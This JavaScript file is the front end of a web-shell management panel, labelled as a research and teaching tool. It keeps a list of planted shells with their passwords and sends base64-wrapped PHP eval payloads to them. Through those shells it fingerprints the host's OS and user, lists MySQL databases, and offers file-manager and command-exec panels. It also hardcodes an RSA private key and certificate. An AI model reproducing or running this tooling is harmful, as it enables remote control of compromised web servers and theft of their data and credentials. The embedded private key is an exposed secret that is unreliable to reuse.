/**
 * Created by abcdlzy on 15/1/20.
 */




var server="";
var key="";
var login=document.getElementById('login');
var mask=document.getElementById('mask');
var CAX509="";
var targetServerGUID="";
var targetServerX509="";
var targetServerGetCAX509="";
var CAIP="";
var interfaceURL="";
var runshellURL="";

var AESKey="";
var AESIV="";
var GUID="";

var NLoginMode=false;

var RSASelfPrivateKey='-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAhHDhBUNX6CiWC8dXhmaQptZGWtxxohM9rjfE/zZg1ukk7u3I GDu8piXNj0YelIE53igbGaOoDYXtHWTmpcsIXoyA7ODp56GXW2iFdTfhwjt4V0cF EzWLsenietMSOE04iu84A44YRWTB8z5O/Du8qDtyP9yjScq6lnyEpug7mvq20r60 WL/6MFCxQ7dCW3NUE0cwgXOEcwVhKqFc7CevaSZp7dH8cJOuO8bcZFh6fnwvIVYS cM7CmfWJzmv0NFKLWkdWdTMbDf/frKPnxOcjRFQge0ElF+mhIuYIHUjCQMIH7SUX rEk4/klaD0w6f2AGPofKPsqMurx+pKOJ74wV1QIDAQABAoIBABSqkopiNEzvTF6h KAi6Z3cJN6hE/txWGUlevXg/kYPnlJJN+2vAopLgkj95pxrwQUnnwzbQgVA+5j2w eYdEc9VhIlsUS5uP7RDf8fdVFX7cDc68r8+MCvTjtKoK1qx/bEPNyVVQrnvhmZwt zGByp+EuiYjqknZY0p3Z508uLOLlYae4Y9I+F/GppRlOkVtLfT8Yrd2Y8kWOXt/w V2Y9jR5PnzbWyorLKOimcWkHdEWT5a+RAYG/xBaLIuCYMcWSeGFWzlXruXfh6eQl VmXQ2b6IySMhZ4H9rnLXzY/TsbD7eisz7+pAUZVWt3TWoapEjx7MRugRcsaW7ePm LSXyiCECgYEAiqaz2748mfAB5QTsacNMIqPCvRupGY5Z8qKzfaLm/KVR0ANw1s1K JmWx/D19BsuYv2sPtTZ3nSGE3NXG4h/EiEQa5Bb71ViNNnuESFlU7TzNeF2KY6kr tUpDk4MwdeYJmUabIw0e1YFja5dxpDinGD8E1L1CsEmqq3wxCpnm5sUCgYEA9Iid ABCVXrr0bBHXaJZt/3e0fXQ244or+luKTrfv+Gw4se+JQLvjvcmBlHPjHfW/UdYG QLiwCupMER9eexyyaUau06cyuBT22nSRuNmSjCiIARKsXQpUa9Or+GwnJ6bN1Ofl vHFmPyYGsTxvkiLE9fmEyzdy/Mu/HcXtnvxV49ECgYAp8Bhw/A66hTUdf6q+ptrt k1kA+E/isgMU+A+QjeiOPLcNUy0bW8b07Ee0wyiBGK4gIBMFPe9aMNxOK79XgEJi 8S6tFSKhOoKkGyI8/ABLLdv8b1a/pFjbIhZklQbgcm8u1INyS7Kq49MdpRYzlQs9 szoT2xdD2VRtQEhZK4oC/QKBgEX/dTG3jYp4ac8lrEu8A/DFC11+DthDjSM1YPn3 nTG3iOMmdluZbS++puEf6zuARSvf4BpWw83cE7ozCJClPkz0dscPbW1UUvVluPD5 FwIX+BaWidB4TIIxLWEHVI39KZ5wY0r2Cxa4g+HoMufaHBdtPZ4OWVQT3rlfFw4T nWKBAoGAHngicAV9WM/AtgHe6h2oOn6XHJJigb0LI8EHlg++Md4zWHpApc1TV3V2 XWgyr44iIigvxAJOXRh508Rh0YYvjs9fRppcZ3W9TI58jmiVS0VCkZ2ZmqM4N9tN w/DCTU5RlRStm7NKy+PgZ0nwyNglcyPD527cQE1pXTY2dL3Xp/c= -----END RSA PRIVATE KEY-----';
var RSASelfX509='-----BEGIN CERTIFICATE----- MIICKDCCAZOgAwIBAgIBADALBgkqhkiG9w0BAQUwHDEaMBgGA1UECgwRcGhwc2Vj bGliIGRlbW8gQ0EwHhcNMTUwMjEyMTI0NzExWhcNMTYwMjEyMTI0NzExWjAaMRgw FgYDVQQKDA8xMTUxMjIwMTM2IGNlcnQwggEgMAsGCSqGSIb3DQEBAQOCAQ8AMIIB CgKCAQEAhHDhBUNX6CiWC8dXhmaQptZGWtxxohM9rjfE/zZg1ukk7u3IGDu8piXN j0YelIE53igbGaOoDYXtHWTmpcsIXoyA7ODp56GXW2iFdTfhwjt4V0cFEzWLseni etMSOE04iu84A44YRWTB8z5O/Du8qDtyP9yjScq6lnyEpug7mvq20r60WL/6MFCx Q7dCW3NUE0cwgXOEcwVhKqFc7CevaSZp7dH8cJOuO8bcZFh6fnwvIVYScM7CmfWJ zmv0NFKLWkdWdTMbDf/frKPnxOcjRFQge0ElF+mhIuYIHUjCQMIH7SUXrEk4/kla D0w6f2AGPofKPsqMurx+pKOJ74wV1QIDAQABMAsGCSqGSIb3DQEBBQOBgQAcTQKI fO9nm0VvDcgixTuVyFkC1OEoChBjMQO47e3h60im3ILfg+ou0D40h390eDrFCJPF KsdTYlK4BntxRIaFkueFm7JCOGzv71NXQKdmB6yEuGNI9IBoq8fO6r8MVhhD1OR9 urUJjrpcx24LIjagKa/WobTLsxrFv5dHmDXmIQ== -----END CERTIFICATE-----';

var loginToken="";

var shellURL="";
var shellPass="";
var shellType="";
var shellExtraConfig=""
var shellNotes="";

var AESKeyII="";
var AESIVII="";

var isEncrypt=true;

function AESAutoEncrypt(text){
    return AESEncrypt(text,AESKeyII,AESIVII);
}

function AESAutoDecrypt(text){
    return AESDecrypt(text,AESKeyII,AESIVII);
}

function AESEncrypt(text,key,iv){

       return CryptoJS.AES.encrypt(text,CryptoJS.enc.Utf8.parse(key),{iv:CryptoJS.enc.Utf8.parse(iv),mode:CryptoJS.mode.ECB}).toString();


}

function AESDecrypt(ciphertext,key,iv){
    var rtn=ciphertext;
    try{
        rtn=CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt({ciphertext:CryptoJS.enc.Hex.parse(ciphertext)},CryptoJS.enc.Utf8.parse(key),{iv:CryptoJS.enc.Utf8.parse(iv),mode:CryptoJS.mode.ECB})).toString();
    }
    catch (e){
        isEncrypt=false;
        rtn=ciphertext;
    }
    return rtn;

}

function RSAEncrypt(text,pem){
    var x509 = new X509();
    x509.readCertPEM(pem);
    return x509.subjectPublicKeyRSA.encrypt(text);
}

function RSADecrypt(ciphertext,privateKey){
    var rsa = new RSAKey();
    rsa.readPrivateKeyFromPEMString(privateKey);
    return rsa.decrypt(ciphertext);
}


function newGuid(){
    var guid = "";
    for (var i=1; i<=32; i++){
        var n = Math.floor(Math.random()*16.0).toString(16);
        guid +=   n;
        if((i==8)||(i==12)||(i==16)||(i==20))
            guid += "-";
    }
    return guid.toUpperCase();
}

function randomString(len) {
    len = len || 32;
    var $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var maxPos = $chars.length;
    var pwd = '';
    for (i = 0; i < len; i++) {
        pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
}

function setURL(url){
    interfaceURL=url+"/interface.php";
    runshellURL=url+"/UI/runshell.php"
    server=url;
}

function interfaceEvent(action,data,returnFunc,errorfunction){

    $.ajax({
        type: 'POST',
        url: interfaceURL,
        data: {action:action,data:data,Token:loginToken},
        success: returnFunc,
        error:errorfunction
    });

}

function runshellEvent(code,returnFunction){
    if(GUID!=""&&AESIVII!=""&&AESKeyII!=""&&isEncrypt&&server.indexOf("localhost")==-1){
        var data=[{"url":shellURL,"pass":shellPass,"code":"eval(urldecode(base64_decode('"+base64.encode(code)+"')));"}];

        $.post(runshellURL, {GUID:GUID,cipher:AESAutoEncrypt(JSON.stringify(data))},
            returnFunction);
    }
    else
    {

        $.post(runshellURL, {URL:shellURL,pass:shellPass,code:"eval(urldecode(base64_decode('"+base64.encode(code)+"')));"},
            returnFunction);
    }

}

function doGetCertStep1(x509OfCA){
//todo c=>s enc by s->x509 (aes key iv)
    //生成AES key 和 iv
    AESKey=randomString();
    AESIV=randomString();
    encData=RSAEncrypt(AESKey+","+AESIV,x509OfCA);
    //发送
    interfaceEvent("doGetCertStep2",encData,function(data){
        if(data.contains('It look like is not CA')){
            alert('It look like is not CA');
        }
        else {
            decryptData = AESDecrypt(data, AESKey, AESIV);
            GUID = decryptData.split(',')[0];
            RSASelfPrivateKey = decryptData.split(',')[1];
            RSASelfX509 = decryptData.split(',')[2];
            doGetCertStep3(x509OfCA)
        }

    });
}
function doGetCertStep3(x509OfCA){
    //todo verify c=>s enc by s->x509 (self::x509)
    encData=RSAEncrypt(GUID,x509OfCA);
    interfaceEvent( "doGetCertStep4", encData,
        function(data){
            if(data.indexOf('noEncrypt')>-1) {
            isEncrypt=false;
            }
            else
            {
                decryptData=RSADecrypt(data,RSASelfPrivateKey);
                AESKeyII=decryptData.split(',')[0];
                AESIVII=decryptData.split(',')[1];
            }

            doLogin();

        });
}



function startLogin(){


    login.style.display='none';

    progressBarInit()

    GUID=newGuid();
    AESKey=randomString();
    AESIV=randomString();
    setURL($('#server').val());

    progressBarOperation(30,true,"正在获取X509,GUID……");


    interfaceEvent("GetPublishX509","",function(data){
        targetServerGetCAX509=data.split(',')[0];
        targetServerGUID=data.split(',')[1];
        doGetCertStep1(targetServerGetCAX509);

    },function(XMLHttpRequest, textStatus, errorThrown){

        loginFaild(XMLHttpRequest.status+":"+textStatus);
    });

}

function goNoLoginMode(){
    setURL($('#server').val());
    $("#noLoginMode").fadeIn(3000);
    $("#login").fadeOut(1000);
    NLoginMode=true;
}

function PostAESKeyIV(){
    progressBarOperation(60,true,"请求CA签发证书并发送……");
    interfaceEvent("GetPublishX509","",function(data){
        if(data=="CA Public X509 is not set"||data=="this is not CA"){
            loginFaild();
        }
        else
        {
            targetServerGetCAX509=data.split(',')[0];
            targetServerGUID=data.split(',')[1];
        }


    });

}


function doLogin(){
    progressBarOperation(80,true,"正在进行登录……");
    server=document.getElementById('server').value;
    var pwd=document.getElementById('password').value;
    var postdata="";
    if(AESKeyII==""||AESIVII==""){
        toastShow('notice','请注意使用VPN等工具保证安全。',5000);
        postdata=server+","+pwd;
    }
    else{
        var enc=AESAutoEncrypt(server+","+pwd);
        postdata=enc.toString();
    }







    interfaceEvent("UIdoLogin",postdata,function(data){
        if(data!="failed"){
            loginToken=data;
            $('#login').hide();
            $('#progress').hide();
            $('#mask').show();
            $('#panel_page_wrap').show();
            panelChange('WebShell');
        }
        else
        {
            loginFaild();
        }
    });

}

function loginFaild(result){
    $('#progress').hide();
    $('#login').show();
    toastShow('warning','登录失败 '+(result?"("+result+")":""),10000);
}


function deleteSignCert(obj,guid){
    activeLoadingImg();
    obj.value='删除中...';
    interfaceEvent("deleteSignCert",loginToken+","+guid,
        function(data){
            if(data=='completed'){
                toastShow('success','证书删除成功',3000);
                $('#'+guid).slideUp();
                //$('#'+guid).remove();
                var count=document.getElementById('signActiveCount').innerHTML;
                document.getElementById('signActiveCount').innerHTML=parseInt(count)-1;
                stopLoadingImg();
            }

        });
}


function deleteShell(obj,UIGUID,url){
    activeLoadingImg();
    obj.value='删除中...';
    interfaceEvent("deleteShell",loginToken+","+url,
        function(data){
            if(data=='completed'){
                toastShow('success','shell删除成功',3000);
                $('#'+UIGUID).slideUp();
                $('#shellRightArea').fadeOut();
            }
            stopLoadingImg();
        });

}

function updateShell(obj,UIGUID){
    url=$('#inputShellURL').val();
    pass=$('#inputShellPass').val();
    type=$('#selectShellType').val();
    //=$('#textareaShellExtraConfig')[0].value;
    extraConfig='';
    notes=$('#inputShellNotes').val();
    if(url.trim()==''){
        toastShow('notice','URL不允许为空',3000);
        return ;
    }
    obj.value='提交中...';
    activeLoadingImg();

    interfaceEvent("updateShell",loginToken+","+url+","+pass+","+type+","+extraConfig+","+notes,
        function(data){
            if(data=='completed'){
                toastShow('success','shell更新成功',3000);

                $('#'+UIGUID+'>a.shell-list-title').text(url);
                $('#'+UIGUID+'>div.shell-list-descr').text(notes);

            }
            else{
                toastShow('warning','失败:（'+data+'）！',8000);

            }
            obj.value='修改';
            stopLoadingImg();
        });
}

function connectShell(){
    useShell("","",$("#noLoginModeURL").val(),$("#noLoginModePASS").val(),"PHP");
}

function backLogin(){
    $("#login").fadeIn(3000);
    $("#noLoginMode").fadeOut(1000);
    NLoginMode=false;
}

function useShell(obj,UIGUID,url,pass,type){
    $('#mask').fadeOut(1000);
    $("#noLoginMode").fadeOut(1000);
    $('#shellPanel').fadeIn(3000);
    shellURL=url;
    shellPass=pass;
    shellType=type;
    getShellInfoArray();
}

function goShellList(){


    if(NLoginMode){
        $('#noLoginMode').fadeIn(3000);
        $('#shellPanel').fadeOut(1000);
    }
    else
    {
        $('#mask').fadeIn(3000);
        $('#shellPanel').fadeOut(1000);
    }


    $('#nowShellHost').html('<i class="fa fa-spinner fa-pulse"></i>数据请求中...');
    $('#nowShellOSInfo').html('<i class="fa fa-spinner fa-pulse"></i>数据请求中...');
    $('#nowShellUser').html('<i class="fa fa-spinner fa-pulse"></i>数据请求中...');
    $('#nowShellUserGroup').html('<i class="fa fa-spinner fa-pulse"></i>数据请求中...');
    document.getElementById('content').innerHTML='<div class="main"><!-- row --><div class="row"><!-- col 12 --><div class="col-md-12"><section class="tile transparent"><div class="jumbotron bg-transparent-black-3"><div class="text-center"><h1>欢迎使用WebShell管理工具</h1><p>此工具作为网站管理工具可能带有攻击性,仅供安全研究与教学之用,风险自负!</p><p>请使用者注意使用环境并遵守国家相关法律法规！</p></div></div></section></div></div></div>';




}

function changeShellFunction(what){
    $.post(server+"/UI/shell/"+what+".php", {URL:shellURL,pass:shellPass},
        function(data){
            document.getElementById('content').innerHTML=data;
            if(what=='MYSQLManager'){
                reloadDataTable();
                reloadChoosen();
            }else
            if(what=='fileManager'){
                initFileManage();

            } else if(what=='var'){
                getPHPVar();

            }
            else if(what=='securityInfo'){
                getSecInfo();

            }
            else if(what=='exec'){
                initExecTypeAhead();
            }
        });

}

function doEvalCode(code,returnFunction){
    runshellEvent(code,returnFunction);
}

function doEval(obj){
    obj.value='提交中...';
    code=$('#evalcode').val();
    document.getElementById('evalReturn').innerHTML='数据请求中……';
    runshellEvent(code,
        function(data,status){
            document.getElementById('evalReturn').innerHTML=data;
            obj.value='提交';
        }).error(function (){document.getElementById('evalReturn').innerHTML="error!";});
}


//链接数据库
function connectSQL(obj){
    $('#mysqlConnectWarning').hide();
    var host=$('#SQLHost').val();
    var user=$('#SQLUser').val();
    var password=$('#SQLPassword').val();
    var postcode="$link=@mysql_connect('"+host+"', '"+user+"', '"+password+"', 1) or die('Failed: '.mysql_error());"
    postcode+="$query = @mysql_query('SHOW DATABASES', $link);"
    postcode+="while($db=@mysql_fetch_array($query,MYSQL_ASSOC)){echo $db['Database'].',';}";
    postcode+="@mysql_close($link);";

    runshellEvent(postcode,
        function(data){
            if(data.indexOf('Failed')!=-1){
                $('#mysqlConnectWarning').html('<strong>⚠</strong>'+data);
                $('#mysqlConnectWarning').show();
            }
            else{
                $('#mysqlConnectWarning').hide();
            }
            $('#selectDB').empty();
            $("#selectDB").append("<option disabled='disabled' selected> -- 选择数据库 -- </option>");
            for(var i=0;i<data.split(',').length-1;i++){
                $("#selectDB").append("<option value='"+data.split(',')[i]+"'>"+data.split(',')[i]+"</option>");
            }

            $("#selectDB").trigger("chosen:updated");

        })
}

function getShellInfoArray(){



    var split="echo ',';";
    var hostAndPort="echo $_SERVER['HTTP_HOST'];";
    var hostName="echo gethostbyname($_SERVER['SERVER_NAME']);";
    var os="echo @php_uname();";
    var user="echo  @get_current_user();";
    var uid="echo  @getmyuid();";
    var groupid="echo  @getmygid();";

    var code=hostAndPort+split+hostName+split+os+split+user+split+uid+split+groupid;
    runshellEvent(code,
        function(data){
            if(data.split(',').length==6){
                $('#nowShellHost').html(data.split(',')[0]+'('+data.split(',')[1]+')');
                $('#nowShellOSInfo').html(data.split(',')[2]);
                $('#nowShellUser').html(data.split(',')[3]+'('+data.split(',')[4]+')');
                $('#nowShellUserGroup').html(data.split(',')[5]);
            }
            else{
                goShellList();
                toastShow('warning','链接Shell异常，请确认Shell是否可以正常访问。',6000);
            }
        });

}


function insertNewShell(obj){
    url=$('#inputShellURL').val();
    pass=$('#inputShellPass').val();
    type=$('#selectShellType').val();
    //extraConfig=$('#textareaShellExtraConfig')[0].value;
    extraConfig='';
    notes=$('#inputShellNotes').val();
    if(url.trim()==''){
        toastShow('notice','URL不允许为空',3000);
        return ;
    }
    obj.value='提交中...';
    activeLoadingImg();

    interfaceEvent("insertShell",loginToken+","+url+","+pass+","+type+","+extraConfig+","+notes,
        function(data){
            if(data=='completed'){
                toastShow('success','shell添加成功',3000);

                tempguid=newGuid();

                addstr='<div class="shell-list-item background-color" id="'+tempguid+'" style="width: 184px;display:none;" onclick="changeShellPanel(\''+url+'\',\''+tempguid+'\')">';
                addstr+='<a href="#" title="random blog post" class="shell-list-title" style="width: 124px;">'+url+'</a>';
                addstr+='<div class="shell-list-descr" style="width: 124px;">'+notes+'</div>';
                addstr+='<div class="shell-list-item-bg background-color"></div>';
                addstr+='</div>';

                $('#shellListNewItem').after(addstr);
                $('#shellListNewItem').removeClass('background-color');
                $('#'+tempguid).slideDown();
                $('#'+tempguid).click();



            }
            else{
                toastShow('warning','失败:（'+data+'）！',8000);
                stopLoadingImg();
            }

        });
}

function changeShellPanel(url,guid){
    activeLoadingImg();
    $.post(server+"/UI/shellInfo.php", {GUID:guid, data: url },
        function(data){
            document.getElementById('shellRightArea').innerHTML=data;
            selectActive();
            stopLoadingImg();
            $('#shellRightArea').fadeIn();
        });
}

function serverCAStatus(status){
    if(status){
        $('#notCAsetting').hide(2000);
        $('#CAsetting').show(1000);
    }
    else
    {
        $('#CAsetting').hide(1000);
        $('#notCAsetting').show(2000);
    }
}

function SQLTypeSetting(type){
    $('#MySQLSetting').hide(1000);
    $('#MSSQLSetting').hide(1000);
    $('#SQLiteSetting').hide(1000);
    $('#FileSetting').hide(1000);
    $('#'+type+'Setting').show(1000);
}

function jumpPage(name,page,targetHtmlArea){
    activeLoadingImg();
    $.post(server+"/UI/"+name+".php", { page: page },
        function(data){
                document.getElementById(targetHtmlArea).innerHTML=data;
            loadJs('./js/custom.js');
            stopLoadingImg();
            selectActive();
        });
}




var panel=document.getElementById('rightSide');
function panelChange(name){
    activeLoadingImg();
    switch (name){
        case 'CertManage':$.post(server+"/UI/CertManage.php",
            function(data){
                panel.innerHTML=data;
                loadJs(server+'/UI/js/custom.js');
                stopLoadingImg();
            });break;
        case 'WebShell':$.post(server+"/UI/WebShellManage.php",
            function(data){
                panel.innerHTML=data;
                loadJs(server+'/UI/js/custom.js');
                selectActive();
                stopLoadingImg();
            });break;
        case 'activeLink':$.post(server+"/UI/activeLink.php",
            function(data){
                panel.innerHTML=data;
                loadJs(server+'/UI/js/custom.js');
                stopLoadingImg();
            });break;
        case 'SystemSetting':$.post(server+"/UI/SystemSetting.php",
            function(data){
                panel.innerHTML=data;
                loadJs(server+'/UI/js/custom.js');
                loadJs(server+'/UI/js/classie.js');
                loadJs(server+'/UI/js/selectFx.js');
                selectActive();
                stopLoadingImg();
            });break;
        default :;break;
    }

}

function modifyPassword(obj){
    interfaceEvent("modifyPassword",$('#oldPwd').val()+","+$('#newPwd').val()+","+$('#renewPwd').val(),function(data){
        if(data=="successful"){
            toastShow("success","修改密码成功",5000)

        }
        else{
            toastShow("warning","修改失败:"+data,5000);
        }
    });
}

function save_sysDB(){
    saveSysMySQLSetting();
}

function saveSysMySQLSetting(){
    interfaceEvent("saveSysMySQLSetting",$('#mysql_host').val()+","+$('#mysql_username').val()+","+$('#mysql_password').val()+","+$('#mysql_database').val(),
    function(data){
        if(data=="end"){
            toastShow("success","保存完成",5000);
        }
        else{
            toastShow("warning","保存失败:"+data,5000);
        }
    });
}

function remakeCAKey(){
    interfaceEvent("remakeCAKey","", function (data) {
        if(data=="successful"){
            toastShow("success","重新生成成功",5000);
            panelChange('SystemSetting');
        }
        else{
            toastShow("warning","生成失败:"+data,5000);
        }
    })
}


var toastLock='toastLock';

function toastShow(type,text,timeOut){

    $.asyncLock.async.lock(toastLock,function(){
        $('#toast_'+type+'_text').html(text);
        $('#toast_'+type).show(1000);
        if(!timeOut) {
            if (type != 'warning') {
                setTimeout(toastHide, 60000);
            }
        }
        else {
            setTimeout(toastHide, timeOut);
        }
    });
}

function toastHide(){
    $('#toast_message').hide(1000);
    $('#toast_warning').hide(1000);
    $('#toast_success').hide(1000);
    $('#toast_notice').hide(1000);

    $.asyncLock.async.releaseLock(toastLock);

}

function activeLoadingImg(){
    $('#loading').addClass('fa-spin');
}

function stopLoadingImg(){
    $('#loading').removeClass('fa-spin');
}

function selectActive(){
    [].slice.call( document.querySelectorAll( 'select.cs-select' ) ).forEach( function(el) {
        new SelectFx(el);
    } );
}

function loadJs(file) {
    var head = $("head").remove("script[role='reload']");
    $("<script></script>").attr({ role: 'reload', src: file, type: 'text/javascript' }).appendTo(head);
}


Array.prototype.distinct=function(){
    var a=[],b=[];
    for(var prop in this){
        var d = this[prop];
        if (d===a[prop]) continue; //防止循环到prototype
        if (b[d]!=1){
            a.push(d);
            b[d]=1;
        }
    }
    return a;
}